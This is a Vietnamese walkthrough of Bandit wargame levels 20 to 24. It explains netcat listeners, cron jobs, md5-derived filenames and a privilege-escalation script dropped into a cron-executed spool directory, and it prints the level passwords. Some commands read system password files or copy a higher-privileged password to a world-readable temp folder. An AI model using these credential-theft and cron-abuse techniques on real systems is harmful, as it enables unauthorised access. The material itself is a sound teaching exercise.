## 🟢 Level 20 -> 21 
* **Mục tiêu:** Tương tác với tệp thực thi SUID `suconnect`. Tệp này đóng vai trò là một Client, tự động kết nối đến một cổng mạng được chỉ định và kiểm tra mật khẩu. Nhiệm vụ là phải thiết lập một Server ngầm để đón đầu và cung cấp mật khẩu cũ cho nó.
* **Cách giải:**
  1. Đăng nhập vào `bandit20` và đọc mật khẩu của tài khoản hiện tại để làm "vật tế thần":
     ```bash
     cat /etc/bandit_pass/bandit20
     ```
     *(Giả sử mật khẩu lấy được là: VxCazJaV...)*
  2. Khởi tạo một máy chủ lắng nghe ngầm (Server). Sử dụng `echo` kết hợp đường ống `|` để nạp sẵn mật khẩu, ném vào công cụ `nc` đang mở chốt ở cổng `4444`, và dùng `&` để ẩn toàn bộ tiến trình này xuống nền:
     ```bash
     echo "VxCazJaV..." | nc -l -p 4444 &
     ```
  3. Khởi chạy công cụ (Client) và điều hướng nó lao thẳng vào cổng `4444` vừa mở:
     ```bash
     ./suconnect 4444
     ```
  4. Hệ thống ngầm giao dịch thành công. Thu thập chuỗi mật khẩu của `bandit21` được in ra trên Terminal.

* **Bài học cốt lõi:**
  * **Mô hình Client - Server:** Hiểu được luồng giao tiếp mạng cơ bản. Netcat (`nc -l`) đóng vai trò là Server đứng đợi, `suconnect` đóng vai trò là Client chủ động tìm đến.
  * **Toán tử Pipe (`|`):** Kỹ thuật chuyển hướng đầu ra (Output) của lệnh này làm đầu vào (Input) của lệnh khác. Ở đây là tự động hóa việc "nhét" dữ liệu thay vì gõ tay.
  * **Job Control (`&`):** Kỹ thuật quản lý tiến trình cốt lõi trong Linux. Giúp đẩy một tác vụ xuống chạy ngầm (Background), giải phóng màn hình Terminal để tiếp tục thực thi các câu lệnh khác, giải quyết triệt để bài toán đa nhiệm trên một giao diện đơn.
 


## 🟢 Level 21 -> 22 
* **Mục tiêu:** Thám thính dịch vụ lập lịch tự động `cron` của hệ điều hành. Phân tích luồng thực thi của một cronjob để truy vết vị trí mật khẩu bị rò rỉ.
* **Cách giải:**
  1. Xâm nhập vào thư mục cấu hình lịch trình hệ thống:
     ```bash
     cd /etc/cron.d/
     ls -la
     ```
  2. Đọc bản hợp đồng lập lịch của mục tiêu `bandit22`:
     ```bash
     cat cronjob_bandit22
     ```
     *(Phát hiện cấu hình: Cứ mỗi phút, hệ thống tự động sử dụng đặc quyền của `bandit22` để chạy tệp kịch bản `/usr/bin/cronjob_bandit22.sh`).*
  3. Đọc mã nguồn của tệp kịch bản để xem nó làm gì:
     ```bash
     cat /usr/bin/cronjob_bandit22.sh
     ```
     *(Phân tích mã nguồn: Kịch bản này sao chép mật khẩu từ `/etc/bandit_pass/bandit22` ra một tệp tin tạm tại `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` và thiết lập quyền đọc cho mọi người).*
  4. Thu thập chiến lợi phẩm từ thư mục tạm:
     ```bash
     cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
     ```
  5. Mật khẩu thu thập được:
     * `tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q`

* **Bài học cốt lõi:**
  * **Cấu trúc cấu hình Cron:** Hiểu cú pháp thời gian (`* * * * *`), định danh người dùng thực thi, và đường dẫn kịch bản bên trong `/etc/cron.d/`.
  * **Lỗ hổng Logic (Logic Flaw):** Lỗ hổng không nằm ở việc sai cú pháp lệnh, mà nằm ở quy trình luân chuyển dữ liệu bất cẩn (Mang dữ liệu nhạy cảm ra thư mục công cộng `/tmp/` và cấp quyền `644`).
  * **Cronjob Privilege Escalation:** Kỹ thuật lợi dụng các công việc tự động chạy dưới quyền cao hơn để trích xuất thông tin hoặc leo thang đặc quyền.



## 🟢 Level 22 -> 23
* **Mục tiêu:** Truy tìm mật khẩu của `bandit23` bị một tiến trình `cron` tự động giấu đi. Điểm khó là tên tệp tin cất giấu không cố định mà được tạo ra ngẫu nhiên thông qua một thuật toán băm (Hashing Algorithm).
* **Cách giải:**
  1. Thám thính cấu hình lịch trình tự động trong thư mục `/etc/cron.d/`:
     ```bash
     cat /etc/cron.d/cronjob_bandit23
     ```
  2. Phân tích tĩnh (Static Analysis) kịch bản thực thi `/usr/bin/cronjob_bandit23.sh` để hiểu cơ chế hoạt động của thuật toán tạo tên file.
     *(Phát hiện hệ thống sử dụng thuật toán: `echo I am user <tên_user> | md5sum | cut -d ' ' -f 1` để tạo tên file nằm trong `/tmp/`).*
  3. Mô phỏng lại thuật toán (Algorithm Simulation). Bắt chước chính xác luồng xử lý của hệ thống nhưng thay biến số bằng mục tiêu `bandit23` để tự tính ra tên file bí mật:
     ```bash
     echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
     ```
     *(Kết quả tính toán trả về chuỗi hash: `8ca319486bfbbc3663ea0fbe81326349`).*
  4. Truy cập vào thư mục tạm và đọc file theo đúng cái tên vừa tính ra để thu thập mật khẩu:
     ```bash
     cat /tmp/8ca319486bfbbc3663ea0fbe81326349
     ```
  5. Mật khẩu thu thập được:
     * `QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G`

* **Bài học cốt lõi:**
  * **Xử lý chuỗi (Text Processing):** Sức mạnh của Pipeline (`|`) trong việc kết nối các công cụ nhỏ thành một dây chuyền lớn. `md5sum` dùng để mã hóa đầu vào thành chuỗi băm duy nhất, `cut` dùng để làm sạch và bóc tách dữ liệu rác.
  * **Tính tất định của thuật toán (Deterministic Algorithm):** Cùng một đầu vào (input) truyền qua một thuật toán cố định sẽ luôn cho ra một đầu ra (output) duy nhất, bất kể ai là người thực thi lệnh đó. Đây là cơ sở để Hacker bẻ khóa hoặc mô phỏng lại các luồng dữ liệu bảo mật.
  * **Kỹ năng Debug:** Khi phân tích tĩnh (đọc mã nguồn) quá khó hiểu, hãy tiến hành phân tích động (chạy thử kịch bản) để xem dữ liệu rác/thông báo lỗi in ra. Từ đó hiểu được logic của người viết mã.
 

## 🟢 Level 23 -> 24 
* **Mục tiêu:** Lợi dụng lỗ hổng cấu hình của tiến trình `cron` thuộc tài khoản `bandit24`. Tiến trình này có hành vi "thực thi mù quáng" mọi tệp tin kịch bản (script) được thả vào thư mục `/var/spool/bandit24/foo`. Nhiệm vụ là tự viết một đoạn script trích xuất mật khẩu và đưa vào thư mục này để hệ thống chạy hộ.
* **Cách giải:**
  1. Tạo một "căn cứ ngầm" tại thư mục công cộng `/tmp/` và mở toang quyền truy cập (`777`) để hứng dữ liệu trả về:
     ```bash
     mkdir /tmp/kma_day21
     chmod 777 /tmp/kma_day21
     cd /tmp/kma_day21
     ```
  2. Tạo tệp tin "mã độc" `lay_pass.sh` bằng trình soạn thảo `nano` (hoặc `echo`) với nội dung ra lệnh hệ thống đọc mật khẩu của `bandit24` và đổ vào căn cứ ngầm:
     ```bash
     #!/bin/bash
     cat /etc/bandit_pass/bandit24 > /tmp/kma_day21/pass24.txt
     ```
  3. Cấp quyền thực thi (`Execute`) cho tệp kịch bản vừa tạo:
     ```bash
     chmod +x lay_pass.sh
     ```
  4. Ném kịch bản vào bẫy và chờ đợi ít nhất 1 phút để ông quản gia `cron` của `bandit24` đi tuần ngang qua:
     ```bash
     cp lay_pass.sh /var/spool/bandit24/foo/
     ```
  5. Đọc kết quả từ tệp tin được sinh ra tại căn cứ ngầm:
     ```bash
     cat /tmp/kma_day21/pass24.txt
     ```
  6. Mật khẩu thu thập được:
     * `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

* **Bài học cốt lõi:**
  * **Shell Scripting cơ bản:** Biết cách khởi tạo (Shebang `#!/bin/bash`) và viết các lệnh tự động hóa đơn giản vào một tệp tin.
  * **Insecure File Execution (Thực thi tệp tin không an toàn):** Việc hệ thống cấp quyền chạy tất cả các file trong một thư mục công cộng mà không kiểm duyệt tính toàn vẹn (Integrity) hoặc chủ sở hữu (Owner) là một lỗ hổng bảo mật chết người.
  * **Kỷ luật chờ đợi (Timing in Exploitation):** Khi khai thác các lỗ hổng liên quan đến tiến trình ngầm (như Cron), kết quả không trả về ngay lập tức. Cần nắm rõ chu kỳ của mục tiêu để căn thời gian chính xác, tránh việc nôn nóng kiểm tra dẫn đến kết luận sai lầm về Exploit của mình.
